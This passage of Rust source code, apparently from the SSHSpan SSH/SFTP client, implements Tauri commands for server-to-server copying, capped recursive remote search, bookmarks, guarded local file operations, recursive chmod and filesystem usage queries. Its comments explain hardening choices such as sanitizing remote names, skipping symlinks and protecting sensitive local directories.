            Some(Err(e)) => return Err(CmdError(e)),
            None => {
                let n = scanned.load(std::sync::atomic::Ordering::SeqCst);
                return Err(CmdError(if n > 0 {
                    format!(
                        "Folder scan stalled after {n} file(s) (source server unresponsive); \
                         {n} already-queued transfer(s) are still running."
                    )
                } else {
                    "Folder scan stalled (source server unresponsive).".into()
                }));
            }
        }
        let n = scanned.load(std::sync::atomic::Ordering::SeqCst);
        if n == 0 {
            return Err(CmdError(
                "Nothing to send (empty or unreadable folder).".into(),
            ));
        }
        return Ok(serde_json::json!({ "ok": true, "target": base_target, "count": n }));
    }

    // Single file: enqueue one job (worker stats it on a fresh channel).
    q_enqueue(
        &app,
        vec![QueuedItem {
            kind: JobKind::ServerCopy,
            session_id: from_session_id,
            server_name: source_server,
            local_path: String::new(), // no user-visible local path; worker stages a temp file
            remote_path: remote,
            size: 0, // stat'd by the worker on a fresh channel
            resume: None,
            preserve_ts: None, // preserve not threaded through Send to (yet)
            target: Some(tfq::ServerCopyTarget {
                session_id: target_session_id,
                server_name: target_server,
                remote_path: base_target.clone(),
            }),
        }],
    );
    Ok(serde_json::json!({ "ok": true, "target": base_target, "count": 1 }))
}

/// Recursively expand a remote directory into per-file ServerCopy jobs,
/// ENQUEUING them in batches as the walk proceeds so transfers start
/// immediately and overlap the scan (a full scan-then-enqueue of a huge tree
/// reads as a frozen "Sending..." on a slow link). Returns the count scanned.
///
/// Child names come from the source server's directory listing
/// (attacker-influenceable on a hostile source), so each segment is sanitized
/// before joining into the target path. Entry type/size come from the
/// listing's own attributes - no per-file round-trip stat.
///
/// Robustness guards (a naive walk freezes on real-world trees):
/// - Symlinks are classified from the listing and skipped, never followed (a
///   followed link can point to an ancestor → infinite recursion).
/// - A path-prefix visited-set breaks directory cycles that survive the above.
/// - A hard cap on scanned files prevents a pathological tree from flooding
///   the queue.
#[allow(clippy::too_many_arguments)]
fn expand_server_copy<'a>(
    enqueue: &'a (dyn Fn(Vec<QueuedItem>) + Send + Sync),
    sftp: &'a russh_sftp::client::SftpSession,
    remote_dir: String,
    target_base: String,
    from_session_id: String,
    source_server: String,
    target_session_id: String,
    target_server: String,
    visited: std::sync::Arc<std::sync::Mutex<std::collections::HashSet<String>>>,
    scanned: std::sync::Arc<std::sync::atomic::AtomicUsize>,
) -> Pin<Box<dyn Future<Output = Result<(), String>> + Send + 'a>> {
    Box::pin(async move {
        const MAX_EXPANDED: usize = 10_000;
        const FLUSH_EVERY: usize = 64; // enqueue this many files at a time
                                       // Cycle guard: don't re-enter a directory we've already walked.
        {
            let mut seen = visited.lock().unwrap();
            if !seen.insert(remote_dir.clone()) {
                log::warn!("[sshspan-sftp] send-to: cycle detected at {remote_dir}, skipping");
                return Ok(());
            }
        }
        let mut entries = sftp
            .read_dir(&remote_dir)
            .await
            .map_err(|e| format!("list {remote_dir}: {e}"))?;
        let mut batch: Vec<QueuedItem> = Vec::new();
        while let Some(entry) = entries.next() {
            if scanned.load(std::sync::atomic::Ordering::SeqCst) >= MAX_EXPANDED {
                log::warn!("[sshspan-sftp] send-to: hit {MAX_EXPANDED} file cap, truncating walk");
                break;
            }
            let name = entry.file_name();
            if name == "." || name == ".." {
                continue;
            }
            let Some(safe) = sanitize_remote_name(&name) else {
                log::warn!(
                    "[sshspan-sftp] send-to: skipping unsafe remote name {name:?} under {remote_dir}"
                );
                continue;
            };
            // The source is read under its REAL name; only the target gets
            // the sanitized one. (The source path used the sanitized name, so
            // any name that needed sanitizing - `back:up` - was read from a
            // file that does not exist.)
            let child_remote = join_remote(&remote_dir, &name);
            let child_target = format!("{}/{}", target_base.trim_end_matches('/'), safe);
            // Classify from the listing's own attributes (symlink-aware): no
            // per-file stat round-trip, except on a server that leaves the
            // type bits out (see `classify_untyped`) - every entry there used
            // to be copied as a file, folders and links included.
            let md = entry.metadata();
            let kind = match classify_attrs(&md) {
                Some(kind) => kind,
                None => classify_untyped(sftp, &child_remote).await.0,
            };
            match kind {
                EntryKind::Dir | EntryKind::File => {}
                // Never followed.
                EntryKind::Symlink => {
                    log::debug!("[sshspan-sftp] send-to: skipping symlink {child_remote}");
                    continue;
                }
                // A pipe's read blocks the source server; a device is no file.
                EntryKind::Other => {
                    log::info!("[sshspan-sftp] send-to: skipping special file {child_remote}");
                    continue;
                }
                EntryKind::Unknown => {
                    log::warn!(
                        "[sshspan-sftp] send-to: skipping {child_remote}: could not tell whether it is a file or a folder"
                    );
                    continue;
                }
            }
            if kind == EntryKind::Dir {
                // Flush pending files before recursing so ordering stays
                // breadth-friendly and the queue keeps filling.
                if !batch.is_empty() {
                    scanned.fetch_add(batch.len(), std::sync::atomic::Ordering::SeqCst);
                    enqueue(std::mem::take(&mut batch));
                }
                expand_server_copy(
                    enqueue,
                    sftp,
                    child_remote,
                    child_target,
                    from_session_id.clone(),
                    source_server.clone(),
                    target_session_id.clone(),
                    target_server.clone(),
                    visited.clone(),
                    scanned.clone(),
                )
                .await?;
            } else {
                // A regular file.
                batch.push(QueuedItem {
                    kind: JobKind::ServerCopy,
                    session_id: from_session_id.clone(),
                    server_name: source_server.clone(),
                    local_path: String::new(),
                    remote_path: child_remote,
                    size: md.size.unwrap_or(0),
                    resume: None,
                    preserve_ts: None,
                    target: Some(tfq::ServerCopyTarget {
                        session_id: target_session_id.clone(),
                        server_name: target_server.clone(),
                        remote_path: child_target,
                    }),
                });
                if batch.len() >= FLUSH_EVERY {
                    scanned.fetch_add(batch.len(), std::sync::atomic::Ordering::SeqCst);
                    enqueue(std::mem::take(&mut batch));
                }
            }
        }
        if !batch.is_empty() {
            scanned.fetch_add(batch.len(), std::sync::atomic::Ordering::SeqCst);
            enqueue(batch);
        }
        Ok(())
    })
}

/// Whether the path a "Send to" starts from is a folder (walked) or a file
/// (one job) - settled like any picked path (see [`picked_root_kind`]); a
/// pipe, socket or device, or a path whose type cannot be told, is refused.
async fn server_copy_root_is_dir(
    sftp: &russh_sftp::client::SftpSession,
    remote: &str,
) -> Result<bool, String> {
    let md = sftp
        .metadata(remote)
        .await
        .map_err(|e| format!("stat {remote}: {e}"))?;
    match picked_root_kind(sftp, remote, &md).await {
        EntryKind::Dir => Ok(true),
        EntryKind::File | EntryKind::Symlink => Ok(false),
        EntryKind::Other => Err(format!(
            "{remote} is not a regular file or folder (a pipe, socket or device), so it cannot be sent."
        )),
        EntryKind::Unknown => Err(format!(
            "The server does not say whether {remote} is a file or a folder, so it cannot be sent."
        )),
    }
}

// ─── recursive remote search ───────────────────────────────────────────────

/// Result cap for [`sftp_search`] - the UI cannot usefully show more.
const SEARCH_MAX_MATCHES: usize = 500;
/// Entry cap for [`sftp_search`]'s walk. The match cap alone does not bound
/// anything: the server chooses the tree and the `is_dir` flag on every entry
/// it reports, so a tree full of NON-matching names (or one where every entry
/// claims to be a directory) never reaches 500 matches and the walk runs until
/// the session dies. `sftp_dir_size` has had an entry ceiling and a deadline
/// since it was written; search had neither.
const SEARCH_MAX_ENTRIES: usize = 200_000;
/// Wall-clock cap for [`sftp_search`]'s walk.
const SEARCH_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(120);
/// Ceiling on the renderer-supplied `max_depth`. The UI never offers more
/// than a few levels, and an unclamped `u32` from the untrusted side of the
/// IPC boundary is just another way to ask for an unbounded walk.
const SEARCH_MAX_DEPTH: u32 = 32;

/// Pure cap check for [`sftp_search`]'s walk, pulled out of the async loop so
/// the stop condition can be unit-tested without a live session. Mirrors
/// [`dir_size_capped`].
fn search_capped(matched: usize, scanned: usize, elapsed: std::time::Duration) -> bool {
    matched > SEARCH_MAX_MATCHES || scanned >= SEARCH_MAX_ENTRIES || elapsed >= SEARCH_TIMEOUT
}

/// Delivers one `sftp-search` event payload: the app's `emit` in production, a
/// collector in the tests.
type SearchEmit = Arc<dyn Fn(serde_json::Value) + Send + Sync>;

/// Everything one search walk shares across its recursion.
struct SearchRun {
    sftp: Arc<russh_sftp::client::SftpSession>,
    emit: SearchEmit,
    session_id: String,
    /// Echoed in EVERY event of this search so the renderer can tell
    /// overlapping searches apart and ignore a stale one (A7-21). `None` only
    /// for a caller that sent no id; the events then carry `null`.
    search_id: Option<String>,
    needle: String,
    max_depth: u32,
    /// Raised by `sftp_search_cancel`, by a newer search of the same session,
    /// by closing the tab and by locking the vault.
    cancel: Arc<std::sync::atomic::AtomicBool>,
    matched: std::sync::atomic::AtomicUsize,
    scanned: std::sync::atomic::AtomicUsize,
    capped: std::sync::atomic::AtomicBool,
    started: std::time::Instant,
}

impl SearchRun {
    fn cancelled(&self) -> bool {
        self.cancel.load(Ordering::SeqCst)
    }

    /// Stop walking: a cap was hit or the search was cancelled.
    fn stopped(&self) -> bool {
        self.capped.load(Ordering::SeqCst) || self.cancelled()
    }

    fn match_event(
        &self,
        path: &str,
        name: &str,
        md: &russh_sftp::protocol::FileAttributes,
    ) -> serde_json::Value {
        serde_json::json!({
            "sessionId": self.session_id, "searchId": self.search_id,
            "path": path, "name": name, "isDir": md.is_dir(),
            "size": md.size.unwrap_or(0),
            "modifiedMs": md.mtime.map(|s| (s as i64) * 1000),
            "done": false,
        })
    }

    fn done_event(&self) -> serde_json::Value {
        serde_json::json!({
            "sessionId": self.session_id, "searchId": self.search_id, "done": true,
            "matched": self.matched.load(Ordering::SeqCst).min(SEARCH_MAX_MATCHES),
            "scanned": self.scanned.load(Ordering::SeqCst),
            "capped": self.capped.load(Ordering::SeqCst),
            "cancelled": self.cancelled(),
        })
    }
}

/// Recursive walker emitting per-result `sftp-search` events with the session
/// and search ids. Bounded by [`search_capped`] (results, entries scanned and
/// wall-clock time, whichever is hit first) and stopped by the cancel flag.
fn walk_search(
    run: Arc<SearchRun>,
    dir: String,
    depth: u32,
) -> Pin<Box<dyn Future<Output = ()> + Send>> {
    Box::pin(async move {
        if depth > run.max_depth || run.stopped() {
            return;
        }
        let mut entries = match run.sftp.read_dir(&dir).await {
            Ok(e) => e,
            Err(_) => return,
        };
        while let Some(entry) = entries.next() {
            if run.stopped() {
                return;
            }
            let name = entry.file_name().to_string();
            if name == "." || name == ".." {
                continue;
            }
            // Budget check per ENTRY. Previously this only fired on a match,
            // so a tree of non-matching names walked forever.
            let seen = run.scanned.fetch_add(1, Ordering::SeqCst) + 1;
            if search_capped(
                run.matched.load(Ordering::SeqCst),
                seen,
                run.started.elapsed(),
            ) {
                run.capped.store(true, Ordering::SeqCst);
                return;
            }
            let full = join_remote(&dir, &name);
            let md = entry.metadata();
            if name.to_lowercase().contains(&run.needle) {
                let m = run.matched.fetch_add(1, Ordering::SeqCst) + 1;
                if m > SEARCH_MAX_MATCHES {
                    run.capped.store(true, Ordering::SeqCst);
                    return;
                }
                (run.emit)(run.match_event(&full, &name, &md));
            }
            if md.is_dir() {
                walk_search(run.clone(), full, depth + 1).await;
            }
        }
    })
}

/// Walk `root` and finish with the `{done:true}` summary - which, for a
/// cancelled search, says so (`cancelled: true`) so a "Stop" button can settle
/// its status line.
async fn run_search(run: Arc<SearchRun>, root: String) {
    walk_search(run.clone(), root, 0).await;
    (run.emit)(run.done_event());
}

/// Recursively search under `root_path` for entries whose name contains
/// `query` (case-insensitive). Streams `sftp-search` events; ends with a
/// `{done:true}` summary.
///
/// Every event carries `searchId` (the optional argument; `null` when the
/// caller sent none). One search per session at a time: starting another
/// cancels the previous walk, which then ends with a `cancelled: true`
/// summary - a renderer must ignore events whose `searchId` is not the
/// current one. `sftp_search_cancel` stops a search explicitly.
#[tauri::command]
pub async fn sftp_search(
    app: AppHandle,
    session_id: String,
    root_path: String,
    query: String,
    max_depth: Option<u32>,
    search_id: Option<String>,
) -> CmdResult<serde_json::Value> {
    use tauri::Emitter;
    let sftp = sftp_from_session(&app, &session_id)?;
    let max_depth = max_depth.unwrap_or(10).min(SEARCH_MAX_DEPTH);
    // The registry needs an id even for a caller that sent none (an older
    // renderer): it only has to be unique per session.
    let registry_id = search_id
        .clone()
        .unwrap_or_else(|| uuid::Uuid::new_v4().to_string());
    let cancel = app
        .state::<SftpRegistry>()
        .begin_search(&session_id, &registry_id);

    let app2 = app.clone();
    let emit: SearchEmit = Arc::new(move |payload| {
        let _ = app2.emit("sftp-search", payload);
    });
    let run = Arc::new(SearchRun {
        sftp,
        emit,
        session_id: session_id.clone(),
        search_id,
        needle: query.to_lowercase(),
        max_depth,
        cancel,
        matched: std::sync::atomic::AtomicUsize::new(0),
        scanned: std::sync::atomic::AtomicUsize::new(0),
        capped: std::sync::atomic::AtomicBool::new(false),
        started: std::time::Instant::now(),
    });
    let app3 = app.clone();
    tauri::async_runtime::spawn(async move {
        run_search(run, root_path).await;
        app3.state::<SftpRegistry>()
            .finish_search(&session_id, &registry_id);
    });
    Ok(serde_json::json!({ "ok": true }))
}

/// Stop the recursive search `search_id` of a session, if it is still the
/// session's current one (a late cancel for a replaced search does nothing).
/// The stopped walk ends with a `{done:true, cancelled:true}` event.
#[tauri::command]
pub fn sftp_search_cancel(
    app: AppHandle,
    session_id: String,
    search_id: String,
) -> CmdResult<serde_json::Value> {
    let cancelled = app
        .state::<SftpRegistry>()
        .cancel_search(&session_id, &search_id);
    Ok(serde_json::json!({ "ok": true, "cancelled": cancelled }))
}

// ─── bookmarks (per-server, settings-backed) ──────────────────────────────

#[tauri::command]
pub fn sftp_bookmarks_list(app: AppHandle, server_id: String) -> CmdResult<serde_json::Value> {
    let key = format!("sftp.bookmarks.{server_id}");
    let raw = app
        .state::<AppState>()
        .db
        .get_config(&key)
        .map_err(|e| e.to_string())?;
    let bookmarks: serde_json::Value = match raw {
        Some(s) => serde_json::from_str(&s).unwrap_or_else(|_| serde_json::json!([])),
        None => serde_json::json!([]),
    };
    Ok(serde_json::json!({ "ok": true, "bookmarks": bookmarks }))
}

#[tauri::command]
pub fn sftp_bookmarks_save(
    app: AppHandle,
    server_id: String,
    bookmarks: serde_json::Value,
) -> CmdResult<serde_json::Value> {
    let key = format!("sftp.bookmarks.{server_id}");
    let json = serde_json::to_string(&bookmarks).map_err(|e| e.to_string())?;
    app.state::<AppState>()
        .db
        .set_config(&key, &json)
        .map_err(|e| e.to_string())?;
    Ok(serde_json::json!({ "ok": true }))
}

// ─── local pane listing (dual-pane mode) ───────────────────────────────────

/// Raw mode bits + owning uid/gid for a local file, mirroring what
/// [`sftp_list_dir`] gets for free from the remote server. Unix-only by
/// nature (Windows ACLs don't map onto a POSIX mode/uid/gid triple); on
/// other platforms the renderer just sees `null` for these three fields,
/// same as it would for an SFTP server that omitted them.
#[cfg(unix)]
fn local_owner_bits(md: &std::fs::Metadata) -> (Option<u32>, Option<u32>, Option<u32>) {
    use std::os::unix::fs::MetadataExt;
    (Some(md.mode()), Some(md.uid()), Some(md.gid()))
}

#[cfg(not(unix))]
fn local_owner_bits(_md: &std::fs::Metadata) -> (Option<u32>, Option<u32>, Option<u32>) {
    (None, None, None)
}

/// List a local directory for the dual-pane local view. Uses the same entry
/// shape as the remote listing so the renderer can share its table renderer.
///
/// Async with the filesystem work in `spawn_blocking` (A7-48): a plain `fn`
/// command runs on the MAIN thread, so listing a huge directory or an
/// unresponsive network/removable drive froze the whole window.
#[tauri::command]
pub async fn sftp_local_list(path: String) -> CmdResult<serde_json::Value> {
    tokio::task::spawn_blocking(move || local_list_blocking(path))
        .await
        .map_err(|e| CmdError(format!("Listing failed: {e}")))?
}

fn local_list_blocking(path: String) -> CmdResult<serde_json::Value> {
    let dir = if path.is_empty() {
        dirs::home_dir().unwrap_or_default()
    } else {
        PathBuf::from(path)
    };
    if !dir.is_dir() {
        return Err(CmdError(format!("Not a directory: {}", dir.display())).into());
    }
    let mut entries: Vec<SftpEntry> = Vec::new();
    let rd = match std::fs::read_dir(&dir) {
        Ok(r) => r,
        Err(e) => return Err(CmdError(format!("read_dir failed: {e}")).into()),
    };
    for e in rd.flatten() {
        // `DirEntry::metadata` does not traverse a symlink on Unix (mirrors
        // `lstat`), matching the remote listing's semantics above.
        let Ok(md) = e.metadata() else { continue };
        let modified_ms = md
            .modified()
            .ok()
            .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
            .map(|d| d.as_millis() as i64);
        let (permissions, uid, gid) = local_owner_bits(&md);
        entries.push(SftpEntry {
            name: e.file_name().to_string_lossy().to_string(),
            is_dir: md.is_dir(),
            is_link: md.is_symlink(),
            size: if md.is_dir() { 0 } else { md.len() },
            modified_ms,
            permissions,
            uid,
            gid,
        });
    }
    entries.sort_by(|a, b| {
        b.is_dir
            .cmp(&a.is_dir)
            .then_with(|| a.name.to_lowercase().cmp(&b.name.to_lowercase()))
    });
    let home = dirs::home_dir().unwrap_or_default().display().to_string();
    Ok(serde_json::json!({
        "ok": true,
        "entries": entries,
        "path": dir.display().to_string(),
        "home": home,
    }))
}

/// Guard a local filesystem MUTATION (delete/rename/mkdir) on the local pane.
///
/// This is the destructive counterpart to `validate_sftp_local_path`, which
/// only ever gated transfer SOURCES and DESTINATIONS. A renderer that can ask
/// the backend to delete an arbitrary local path has a capability the vault
/// lock does not take away, so the same boundaries apply: nothing inside the
/// app data directory (the vault database lives there), nothing inside a
/// system directory, and - as writes - none of the sensitive locations
/// (`~/.ssh`, SSHSpan's config directory, Startup folders, shell rc files).
/// The vault must also be unlocked, matching every other command that touches
/// the filesystem on the user's behalf.
fn validate_local_mutation(app: &AppHandle, path: &str) -> CmdResult<PathBuf> {
    require_unlocked(app)?;
    validate_local_target(path, LocalAccess::Write)
}

/// The filesystem-probing half of [`validate_local_mutation`] (everything but
/// the vault gate), so the async commands can run it inside `spawn_blocking`.
fn validate_local_target(path: &str, access: LocalAccess) -> CmdResult<PathBuf> {
    validate_local_target_with(path, access, &SensitiveLocations::current())
}

fn validate_local_target_with(
    path: &str,
    access: LocalAccess,
    sensitive: &SensitiveLocations,
) -> CmdResult<PathBuf> {
    validate_sftp_local_path_with(path, access, sensitive)?;
    let p = PathBuf::from(path);
    // A bare drive root (`C:\`) or `/` is technically absolute and outside the
    // app data dir, but "delete the root of the filesystem" is never what the
    // user meant and the recursive delete below would happily attempt it.
    if p.parent().is_none() {
        return Err("Refusing to operate on a filesystem root.".into());
    }
    Ok(p)
}

/// What a local delete must clear before anything is removed.
/// The write deny-list applies to the path itself; a delete must also not
/// take a protected location WITH it: deleting the home folder deleted
/// `~/.ssh`, the shell rc files and SSHSpan's data.
fn validate_local_delete_with(path: &str, sensitive: &SensitiveLocations) -> CmdResult<PathBuf> {
    let target = validate_local_target_with(path, LocalAccess::Write, sensitive)?;
    refuse_holding_folder(&target, "delete", sensitive)?;
    Ok(target)
}

/// What a local rename or move must clear, for both of its ends. Moving the
/// folder that holds `~/.ssh` away (its new name is on no list), writing into
/// it and moving it back got round every check; so did moving a prepared
/// folder into that place.
fn validate_local_rename_with(
    from: &str,
    to: &str,
    sensitive: &SensitiveLocations,
) -> CmdResult<(PathBuf, PathBuf)> {
    let src = validate_local_target_with(from, LocalAccess::Write, sensitive)?;
    let dst = validate_local_target_with(to, LocalAccess::Write, sensitive)?;
    refuse_holding_folder(&src, "move", sensitive)?;
    refuse_holding_folder(&dst, "replace", sensitive)?;
    Ok((src, dst))
}

/// Refuse to `verb` a folder that holds a protected location.
fn refuse_holding_folder(
    path: &std::path::Path,
    verb: &str,
    sensitive: &SensitiveLocations,
) -> CmdResult<()> {
    match sensitive.held_by(path) {
        Some(what) => Err(CmdError(format!(
            "{} contains {what}, so SSHSpan will not {verb} it. Choose the files or folders inside it instead.",
            path.display()
        ))),
        None => Ok(()),
    }
}

/// Create a directory on the LOCAL filesystem (dual-pane counterpart to
/// `sftp_mkdir`, which only ever creates remote directories).
#[tauri::command]
pub fn sftp_local_mkdir(app: AppHandle, path: String) -> CmdResult<serde_json::Value> {
    let dir = validate_local_mutation(&app, &path)?;
    if dir.exists() {
        return Err(CmdError(format!("Already exists: {}", dir.display())).into());
    }
    std::fs::create_dir(&dir).map_err(|e| CmdError(format!("Could not create folder: {e}")))?;
    Ok(serde_json::json!({ "ok": true }))
}

/// Rename or move a LOCAL file/directory. Both endpoints are validated, so a
/// rename cannot be used to move a file INTO the app data directory either.
#[tauri::command]
pub fn sftp_local_rename(app: AppHandle, from: String, to: String) -> CmdResult<serde_json::Value> {
    require_unlocked(&app)?;
    let (src, dst) = validate_local_rename_with(&from, &to, &SensitiveLocations::current())?;
    if !src.exists() {
        return Err(CmdError(format!("Not found: {}", src.display())).into());
    }
    if dst.exists() {
        return Err(CmdError(format!("Already exists: {}", dst.display())).into());
    }
    std::fs::rename(&src, &dst).map_err(|e| CmdError(format!("Rename failed: {e}")))?;
    Ok(serde_json::json!({ "ok": true }))
}

/// Delete a LOCAL file or directory. Directories are removed recursively, so
/// this is the most destructive command in the app; the renderer asks for
/// confirmation before it is reached, and the path gate above is the backend's
/// own boundary (a compromised renderer does not get to skip the dialog).
///
/// Async with the deletion in `spawn_blocking` (A7-48): `remove_dir_all` on a
/// big tree froze the window while it ran on the main thread.
#[tauri::command]
pub async fn sftp_local_remove(
    app: AppHandle,
    path: String,
    is_dir: bool,
) -> CmdResult<serde_json::Value> {
    require_unlocked(&app)?;
    tokio::task::spawn_blocking(move || local_remove_blocking(&path, is_dir))
        .await
        .map_err(|e| CmdError(format!("Delete failed: {e}")))?
}

fn local_remove_blocking(path: &str, is_dir: bool) -> CmdResult<serde_json::Value> {
    let target = validate_local_delete_with(path, &SensitiveLocations::current())?;
    if !target.exists() {
        return Err(CmdError(format!("Not found: {}", target.display())).into());
    }
    // Re-check the resolved target, not just the string: a symlink inside an
    // allowed directory can point at a protected one, and removing through it
    // would reach the same files the path gate just refused. Mirrors the
    // canonicalized check `is_protected_upload_source` performs for uploads.
    if is_protected_upload_source(&target) {
        return Err("That path resolves into a protected location.".into());
    }
    let result = if is_dir {
        std::fs::remove_dir_all(&target)
    } else {
        std::fs::remove_file(&target)
    };
    result.map_err(|e| CmdError(format!("Delete failed: {e}")))?;
    Ok(serde_json::json!({ "ok": true }))
}

/// Open a local path's containing folder in the OS file manager
/// (Explorer/Finder/whatever the desktop provides). Read-only with respect to
/// the file: the app data and system-directory gates still apply so the
/// renderer cannot use this as a probe for locations it is not allowed to
/// name, and the vault must be unlocked like every other local-filesystem
/// command.
///
/// Opens the FOLDER rather than the item itself: `opener::open` on a file
/// launches it with its associated application, which for an executable is a
/// code-execution primitive - the same reason `system_open_external` refuses
/// non-inert extensions. The `reveal` variant of the crate would select the
/// item inside the folder, but it is behind a feature flag that pulls in new
/// dependencies (`url`, `dbus`) for a cosmetic difference, so this opens the
/// containing folder instead.
#[tauri::command]
pub fn sftp_local_open_folder(app: AppHandle, path: String) -> CmdResult<serde_json::Value> {
    // Revealing a folder neither reads nor writes anything, so only the base
    // rules apply - the write deny-list would refuse "open folder" on `~/.ssh`.
    require_unlocked(&app)?;
    let target = validate_local_target(&path, LocalAccess::Basic)?;
    if !target.exists() {
        return Err(CmdError(format!("Not found: {}", target.display())).into());
    }
    let folder = if target.is_dir() {
        target
    } else {
        target
            .parent()
            .ok_or_else(|| CmdError("That path has no containing folder.".into()))?
            .to_path_buf()
    };
    opener::open(&folder).map_err(|e| CmdError(e.to_string()))?;
    Ok(serde_json::json!({ "ok": true, "folder": folder.display().to_string() }))
}

/// Read the current permission bits of a remote path (prefill for the dialog).
#[tauri::command]
pub async fn sftp_get_permissions(
    app: AppHandle,
    session_id: String,
    path: String,
) -> CmdResult<serde_json::Value> {
    let sftp = sftp_from_session(&app, &session_id)?;
    let md = sftp
        .metadata(&path)
        .await
        .map_err(|e| CmdError(format!("stat failed: {e}")))?;
    Ok(serde_json::json!({ "ok": true, "mode": md.permissions }))
}

async fn chmod_one(
    sftp: &russh_sftp::client::SftpSession,
    path: &str,
    mode: u32,
) -> Result<(), String> {
    // SFTP v3 setstat applies only the fields present in the attrs; send a
    // fresh attrs carrying just the permission bits.
    let mut attrs = russh_sftp::protocol::FileAttributes::default();
    attrs.permissions = Some(mode);
    sftp.set_metadata(path, attrs)
        .await
        .map_err(|e| format!("{path}: {}", sftp_error_detail(e)))
}

/// What a path the user PICKED is - the root of a recursive chmod, of a
/// download or of a "Send to": STAT's type (a link is followed, like
/// `chmod -R` on a command-line link: the user chose it), else LSTAT's, else
/// whether it opens as a folder. A server whose STAT omits the type bits used
/// to get a silent root-only chmod that ignored the files/dirs scope (JU1
/// review), and a folder it downloaded as if it were a file.
async fn picked_root_kind(
    sftp: &russh_sftp::client::SftpSession,
    path: &str,
    stat: &russh_sftp::protocol::FileAttributes,
) -> EntryKind {
    if let Some(kind) = classify_attrs(stat) {
        return kind;
    }
    if let Ok(lstat) = sftp.symlink_metadata(path).await {
        match classify_attrs(&lstat) {
            Some(EntryKind::Symlink) | None => {}
            Some(kind) => return kind,
        }
    }
    probe_folder(sftp, path).await
}

/// Change permission bits on a remote file/directory, optionally recursively.
///
/// A recursive run (A7-20) skips symbolic links, keeps going past entries the
/// server refuses, and reports what happened: `{ok, changed, failed: [...],
/// failedCount, skippedLinks}`. It is an error only when NOTHING was changed
/// and something failed (so a single refused path still reads as a failure).
/// Setuid/setgid/sticky bits in `mode` reach the path itself and the folders
/// a recursive run walks, never the files (or other non-folders) below it:
/// those get `mode & 0o777` (see [`chmod_path`]).
#[tauri::command]
pub async fn sftp_chmod(
    app: AppHandle,
    session_id: String,
    path: String,
    mode: u32,
    recursive: bool,
    apply_to: Option<String>, // "all" (default) | "files" | "dirs"
) -> CmdResult<serde_json::Value> {
    let sftp = sftp_from_session(&app, &session_id)?;
    let (apply_files, apply_dirs) = match apply_to.as_deref() {
        Some("files") => (true, false),
        Some("dirs") => (false, true),
        _ => (true, true),
    };
    chmod_path(&sftp, &path, mode, recursive, apply_files, apply_dirs)
        .await
        .map_err(CmdError)
}

/// [`sftp_chmod`] on an open SFTP session.
async fn chmod_path(
    sftp: &russh_sftp::client::SftpSession,
    path: &str,
    mode: u32,
    recursive: bool,
    apply_files: bool,
    apply_dirs: bool,
) -> Result<serde_json::Value, String> {
    let md = sftp
        .metadata(path)
        .await
        .map_err(|e| format!("stat failed: {e}"))?;
    let root = if recursive {
        picked_root_kind(sftp, path, &md).await
    } else {
        EntryKind::File
    };
    if root == EntryKind::Unknown {
        // The renderer shows this as "<path>: <message>".
        return Err(
            "The server does not say whether this is a folder, so the change \
             cannot recurse into subdirectories here. Apply it without \"Recurse into \
             subdirectories\" to change this item only."
                .to_string(),
        );
    }

    let mut changed = 0u32;
    let mut outcome = ChmodOutcome::default();
    if root == EntryKind::Dir {
        // Apply to the root path itself according to the dirs rule, then walk.
        if apply_dirs {
            chmod_one(sftp, path, mode).await?;
            changed += 1;
        }
        // Special bits go to folders only (JU1's policy, now the backend's
        // own): a 2775 shared folder must not make every file below it
        // setgid, nor a 4755 one every file setuid. The renderer splits such
        // a mode only when the root's STAT reports a folder; this holds for a
        // server that leaves the type out as well.
        let file_mode = mode & 0o777;
        outcome = chmod_walk(
            path,
            |dir| async move { list_remote_dir(sftp, &dir).await },
            |entry, kind| async move {
                let mode = if kind == EntryKind::Dir {
                    mode
                } else {
                    file_mode
                };
                chmod_one(sftp, &entry, mode).await
            },
            apply_files,
            apply_dirs,
        )
        .await;
        changed += outcome.changed;
    } else {
        chmod_one(sftp, path, mode).await?;
        changed += 1;
    }
    if changed == 0 && outcome.failed.total > 0 {
        return Err(outcome.failed.items.first().cloned().unwrap_or_default());
    }
    Ok(serde_json::json!({
        "ok": true,
        "changed": changed,
        "failedCount": outcome.failed.total,
        "failed": outcome.failed.into_vec(),
        "skippedLinks": outcome.skipped_links,
    }))
}

// ─── new empty file ────────────────────────────────────────────────────────

/// Create an empty remote file (fails if it already exists is NOT enforced -
/// opening with TRUNCATE on an existing path would wipe it, so we stat first).
#[tauri::command]
pub async fn sftp_touch(
    app: AppHandle,
    session_id: String,
    path: String,
) -> CmdResult<serde_json::Value> {
    let sftp = sftp_from_session(&app, &session_id)?;
    if sftp.metadata(&path).await.is_ok() {
        return Err(CmdError(format!("{path} already exists.").into()));
    }
    let f = sftp
        .create(&path)
        .await
        .map_err(|e| CmdError(format!("create failed: {e}")))?;
    f.close()
        .await
        .map_err(|e| CmdError(format!("close failed: {e}")))?;
    Ok(serde_json::json!({ "ok": true, "path": path }))
}

// ─── filesystem usage (statvfs@openssh.com) ───────────────────────────────

/// Free/total space for the filesystem holding `path`. Returns
/// `{supported:false}` when the server doesn't implement the extension.
#[tauri::command]
pub async fn sftp_fs_info(
    app: AppHandle,
    session_id: String,
    path: String,
) -> CmdResult<serde_json::Value> {
    let sftp = sftp_from_session(&app, &session_id)?;
    match sftp.fs_info(&path).await {
        Ok(Some(v)) => {
            let unit = if v.fragment_size > 0 {
                v.fragment_size
            } else {
                v.block_size
            };
            let total = unit.saturating_mul(v.blocks);
            let free = unit.saturating_mul(v.blocks_free);
            let avail = unit.saturating_mul(v.blocks_avail);
            let read_only = v.flags & 0x1 != 0; // SSH_FXE_STATVFS_ST_RDONLY
            Ok(serde_json::json!({
                "ok": true, "supported": true,
                "totalBytes": total, "freeBytes": free, "availBytes": avail,
                "readOnly": read_only,
            }))
        }
        Ok(None) => Ok(serde_json::json!({ "ok": true, "supported": false })),
        Err(e) => Err(CmdError(format!("statvfs failed: {e}"))),
    }
}

// ─── on-demand directory size ─────────────────────────────────────────────

/// Hard cap on entries scanned by [`sftp_dir_size`], shared with the
/// wall-clock cap below - whichever is hit first stops the walk. Sized the
/// same order of magnitude as [`expand_server_copy`]'s scan cap: an
/// interactive "get size" click should give an answer (even if `truncated`)
/// rather than hang the UI on a pathological tree.
const DIR_SIZE_MAX_ENTRIES: u64 = 50_000;
/// Wall-clock cap for [`sftp_dir_size`]'s walk.
const DIR_SIZE_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(120);

/// Pure cap check for [`sftp_dir_size`]'s walk, pulled out of the async loop
